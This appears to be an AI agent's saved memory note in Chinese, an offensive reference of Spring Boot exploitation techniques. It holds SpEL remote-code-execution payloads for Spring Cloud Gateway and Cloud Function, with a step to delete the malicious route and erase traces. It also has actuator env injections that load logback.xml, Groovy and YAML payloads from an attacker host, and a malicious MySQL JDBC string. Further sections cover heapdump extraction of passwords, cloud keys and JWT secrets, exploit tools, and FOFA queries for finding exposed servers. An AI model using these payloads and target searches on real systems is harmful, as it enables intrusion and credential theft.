---
name: kb_springboot_vulns_poc_2026
description: SpringBoot全套漏洞POC Actuator/Cloud Gateway/Cloud Function/反序列化/heapdump/SpEL注入
metadata: 
  node_type: memory
  type: reference
  originSessionId: 5d675b98-bcc4-43f6-b8de-46635cd0836f
---

# SpringBoot 漏洞POC全集 (2026版)

## 一、Spring Cloud Gateway RCE (最严重)

### CVE-2025-41243 (CVSS 10.0)
- **组件**: Spring Cloud Gateway Server WebFlux (WebMVC不受影响)
- **条件**: `management.endpoints.web.exposure.include=gateway` 且 Actuator 未授权
- **影响**: `3.1.0~3.1.10` / `4.0.0~4.0.x` / `4.1.0~4.1.10` / `4.2.0~4.2.4` / `4.3.0~4.3.0`
- **POC逻辑**:
```
1. POST /actuator/gateway/routes/{id} 添加含SpEL payload的恶意路由
2. POST /actuator/gateway/refresh 刷新触发执行
3. DELETE /actuator/gateway/routes/{id} 清除痕迹
```

### CVE-2022-22947 (经典Gateway SpEL)
- 添加恶意路由，SpEL表达式: `#{T(java.lang.Runtime).getRuntime().exec("cmd")}`
- POC广泛流传，一键化工具成熟

---

## 二、Actuator 端点利用矩阵

### 信息泄露类
| 端点 | 泄露内容 | 危害 |
|------|----------|------|
| `/actuator/heapdump` | JVM内存→明文密码/AKSK/DB连接串/JWT密钥 | ⭐⭐⭐⭐⭐ |
| `/actuator/env` | 环境变量/配置属性 | ⭐⭐⭐⭐ |
| `/actuator/configprops` | @ConfigurationProperties 完整值 | ⭐⭐⭐ |
| `/actuator/mappings` | 全部路由映射 | ⭐⭐⭐ |
| `/actuator/beans` | Spring Bean列表 | ⭐⭐ |
| `/actuator/gateway/routes` | 网关路由 | ⭐⭐⭐⭐ |

### RCE利用类
| 端点 | 利用链 | 条件 |
|------|--------|------|
| `/actuator/gateway/routes` | SpEL注入→RCE | Gateway+WebFlux |
| `/actuator/jolokia` 或 `/jolokia` | JMX→JNDI注入→RCE | jolokia依赖 |
| `/actuator/loggers` | 修改日志级别暴露敏感信息 | 需认证少 |

---

## 三、Spring Cloud Function SpEL (CVE-2022-22963)

- **条件**: spring-cloud-function 路由function时HTTP头注入
- **POC**:
```
POST /functionRouter
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")
```

---

## 四、反序列化攻击面

### 1. SnakeYAML 反序列化
- `spring.cloud.bootstrap.location` 远程加载恶意YAML → RCE
- Spring Cloud Config 相关配置接受YAML解析

### 2. MySQL JDBC 反序列化
- jdbc连接串注入: `jdbc:mysql://attacker:3306/db?autoDeserialize=true`
- 配合恶意MySQL服务端 + ysoserial

### 3. Eureka XStream 反序列化
- 双端口配合: HTTP端口+XStream payload→反弹shell端口
- 发送后驻留持续请求可能导致服务异常

### 4. 原生Java反序列化
- **特征**: hex `ac ed 00 05` / base64 `rO0AB`
- 关注: ObjectInputStream.readObject(), XMLDecoder, XStream

---

## 五、env 端点动态属性注入RCE

### logging.config → Logback JNDI
```
POST /actuator/env
{"name":"logging.config", "value":"http://attacker/logback.xml"}
```
logback.xml中配置JNDI lookup→RCE

### spring.datasource.data → H2 SQL执行
```
POST /actuator/env
{"name":"spring.datasource.data", "value":"CREATE ALIAS EXEC AS ..."}
```

### spring.main.sources → Groovy RCE
```
POST /actuator/env
{"name":"spring.main.sources", "value":"http://attacker/evil.groovy"}
```

---

## 六、heapdump 利用全流程

```
1. GET /actuator/heapdump → 下载 .hprof 文件
2. 工具提取: JDumpSpider / heapdump_tool.jar / MemoryAnalyzer
3. 提取目标:
   - spring.datasource.password (DB密码)
   - redis.password (Redis密码)
   - accessKey/secretKey (云AKSK)
   - jwt.secret (JWT签名密钥)
   - management.security.roles (用户凭据)
   - Authorization header (HTTP认证头)
```

---

## 七、检测工具链

| 工具 | 用途 |
|------|------|
| [SpringBootVulExploit](https://github.com/LandGrey/SpringBootVulExploit) | 综合漏洞检测+利用 |
| [SpringBoot-Scan](https://github.com/AabyssZG/SpringBoot-Scan) | 渗透测试框架 |
| SpringBootExploit-1.3-SNAPSHOT-all.jar | 一键利用 |
| JNDIExploit-1.3-SNAPSHOT.jar | JNDI注入 |
| JDumpSpider / heapdump_tool.jar | heapdump解析 |

## 八、检测优先级（按危害）

1. `/actuator` + `/actuator/gateway/routes` → Gateway RCE
2. `/actuator/heapdump` → 提取密码/密钥
3. `/actuator/env` + eureka/spring.cloud.bootstrap → SnakeYAML RCE
4. `/actuator/jolokia` → JMX→JNDI
5. `/functionRouter` → Spring Cloud Function SpEL
6. `/druid/index.html` → Druid未授权→session盗取

## 九、FOFA 指纹

```
body="swagger-ui" && header="X-Application-Context"
header="X-Application-Context"
body="Whitelabel Error Page" && body="Spring Boot"
icon_hash="116323821"  // Spring Boot 默认favicon
```
